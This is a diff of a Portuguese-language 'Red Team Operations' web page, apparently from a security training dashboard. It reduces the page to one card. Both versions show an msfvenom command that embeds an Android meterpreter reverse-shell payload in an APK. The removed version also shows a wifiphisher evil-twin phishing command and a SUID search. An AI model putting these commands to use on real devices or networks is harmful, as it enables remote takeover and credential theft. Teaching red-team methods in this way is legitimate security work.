@@ -1,70 +1,25 @@
-```html
 <!DOCTYPE html>
 <html lang="pt-BR" translate="no">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER SECURITY - RED TEAM TACTICS</title>
+    <title>RED TEAM OPERATIONS</title>
     <style>
-        :root {
-            --bg-deep: #02040a;
-            --bg-card: rgba(13, 17, 23, 0.9);
-            --neon-red: #ff7b72;
-            --neon-cyan: #00ffcc;
-            --text-main: #c9d1d9;
-            --text-muted: #8b949e;
-        }
+        :root { --bg-corporate: #040711; --bg-surface: #0a1122; --bg-terminal: #02040a; --accent-red: #ef4444; --accent-cyan: #06b6d4; --text-main: #f8fafc; --text-secondary: #94a3b8; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background-color: var(--bg-deep); color: var(--text-main); padding: 20px; }
-        .header-cyber { text-align: center; padding: 30px 15px; border-bottom: 1px solid rgba(255, 123, 114, 0.2); margin-bottom: 30px; }
-        .header-cyber h1 { font-size: 2rem; color: #ffffff; background: linear-gradient(135deg, #ffffff, var(--neon-red)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .nav-back { margin-bottom: 20px; display: inline-block; color: var(--neon-cyan); text-decoration: none; font-family: monospace; font-size: 0.9rem; }
-        .section-title { font-size: 1.1rem; text-transform: uppercase; color: #ffffff; margin-bottom: 20px; border-left: 4px solid var(--neon-red); padding-left: 10px; }
-        .grid-layout { display: grid; grid-template-columns: 1fr; gap: 20px; }
-        .card { background: var(--bg-card); border: 1px solid #30363d; border-radius: 12px; padding: 22px; }
-        .card-meta { font-family: monospace; font-size: 0.75rem; color: var(--neon-red); font-weight: bold; margin-bottom: 8px; }
-        .card h3 { font-size: 1.2rem; color: #ffffff; margin-bottom: 10px; }
-        .card p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; margin-bottom: 15px; }
-        .code-box { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 12px; font-family: monospace; font-size: 0.8rem; color: #ff7b72; overflow-x: auto; white-space: pre-wrap; }
+        body { background-color: var(--bg-corporate); color: var(--text-main); padding: 15px; }
+        .nav-back { color: var(--accent-cyan); text-decoration: none; font-family: monospace; display: block; margin-bottom: 20px; font-weight: bold; }
+        .panel { background: var(--bg-surface); border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; padding: 20px; margin-bottom: 15px; }
+        .title { border-left: 4px solid var(--accent-red); padding-left: 10px; font-size: 1.2rem; text-transform: uppercase; margin-bottom: 15px; }
+        .code { background: var(--bg-terminal); padding: 12px; border-radius: 6px; font-family: monospace; color: #ff7b72; margin-top: 10px; overflow-x: auto; white-space: pre-wrap; }
     </style>
 </head>
 <body>
-
-    <!-- BOTÃO PARA RETORNAR À TELA ANTERIOR -->
-    <a href="index.html" class="nav-back">← RETORNAR AO DASHBOARD PRINCIPAL</a>
-
-    <header class="header-cyber">
-        <h1>MÓDULO 01 // RED TEAM OPERATIONS</h1>
-        <p style="font-family: monospace; color: var(--neon-red); font-size: 0.8rem; margin-top: 5px;">REPOSITÓRIO DE EXPLOITS E VETORES DE INTRUSÃO ATIVOS</p>
-    </header>
-
-    <main>
-        <h2 class="section-title">Playbooks Ofensivos Científicos</h2>
-        <div class="grid-layout">
-            
-            <div class="card">
-                <div class="card-meta">ATTACK_VECTOR // WIRELESS_EXPLOIT</div>
-                <h3>Ataque Evil Twin AP (Gêmeo Maligno Wi-Fi)</h3>
-                <p>Simulação controlada de clonagem de antenas transmissoras corporativas para auditoria de tráfego de credenciais de usuários em trânsito.</p>
-                <div class="code-box">wifiphisher --evil-twin [BSSID] -p firmware-upgrade</div>
-            </div>
-
-            <div class="card">
-                <div class="card-meta">ATTACK_VECTOR // MOBILE_INTRUSION</div>
-                <h3>Sideloading e Persistência Reverse APK</h3>
-                <p>Engenharia reversa em pacotes de instalação móvel para validação de firewalls de borda e regras de sandboxing em sistemas Android corporativos.</p>
-                <div class="code-box">msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o audit_test.apk</div>
-            </div>
-
-            <div class="card">
-                <div class="card-meta">ATTACK_VECTOR // LOCAL_PRIV_ESC</div>
-                <h3>Exploitação SUID Linux Kernel</h3>
-                <p>Verificação de permissões administrativas incorretas em servidores locais para mitigar riscos de escalonamento vertical de privilégios.</p>
-                <div class="code-box">find / -perm -4000 -type f 2>/dev/null</div>
-            </div>
-
-        </div>
-    </main>
-
+    <a href="index.html" class="nav-back">← RETORNAR AO PANEL PRINCIPAL</a>
+    <div class="panel">
+        <h2 class="title">Módulo 01 // Red Team Operations</h2>
+        <p style="color: var(--text-secondary); font-size: 0.9rem;">Manuais avançados de simulação de adversários e táticas de intrusão perimetral.</p>
+        <div class="code"># Simulação de Engenharia Reversa em APKs móveis&#10;msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o audit.apk</div>
+    </div>
 </body>
 </html>
